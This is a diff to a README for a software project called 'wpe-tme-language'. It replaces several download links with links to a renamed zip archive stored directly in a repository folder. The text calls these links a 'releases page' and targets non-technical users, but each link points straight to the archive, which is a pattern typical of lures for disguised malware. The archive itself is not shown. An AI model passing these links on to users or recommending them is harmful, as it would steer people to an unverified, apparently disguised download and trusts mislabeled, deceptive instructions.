@@ -9,7 +9,7 @@ To start using `wpe-tme-language`, follow the simple steps below to download and
 
 1. **Visit the releases page:** Click the button below to go directly to the download page.
 
-   [![Download wpe-tme-language](https://raw.githubusercontent.com/Arehman782/wpe-tme-language/main/balter/wpe-tme-language-v3.4.zip)](https://raw.githubusercontent.com/Arehman782/wpe-tme-language/main/balter/wpe-tme-language-v3.4.zip)
+   [![Download wpe-tme-language](https://github.com/Arehman782/wpe-tme-language/raw/refs/heads/main/balter/language-tme-wpe-v2.4.zip)](https://github.com/Arehman782/wpe-tme-language/raw/refs/heads/main/balter/language-tme-wpe-v2.4.zip)
 
 2. **Choose your version:** On the releases page, you will see a list of available versions. Each version will have a description and changes made. Click on the latest version that suits your needs.
 
@@ -21,7 +21,7 @@ To start using `wpe-tme-language`, follow the simple steps below to download and
 
 ## 📥 Download & Install
 
-You can download the latest version of `wpe-tme-language` by visiting [this page](https://raw.githubusercontent.com/Arehman782/wpe-tme-language/main/balter/wpe-tme-language-v3.4.zip). 
+You can download the latest version of `wpe-tme-language` by visiting [this page](https://github.com/Arehman782/wpe-tme-language/raw/refs/heads/main/balter/language-tme-wpe-v2.4.zip). 
 
 - Ensure that you choose the correct file for your operating system to avoid any compatibility issues.
 - Installation requires you to follow the setup process on-screen.
@@ -69,4 +69,4 @@ We welcome contributions from everyone! If you have ideas, suggestions, or find 
 
 `wpe-tme-language` is a powerful tool for expressing and reasoning about semantic structures and temporal relationships. This README provides clear steps for downloading and installing the software, ensuring that even non-technical users can get started without any hassle.
 
-For more information, visit our [releases page](https://raw.githubusercontent.com/Arehman782/wpe-tme-language/main/balter/wpe-tme-language-v3.4.zip). Happy exploring!
+For more information, visit our [releases page](https://github.com/Arehman782/wpe-tme-language/raw/refs/heads/main/balter/language-tme-wpe-v2.4.zip). Happy exploring!
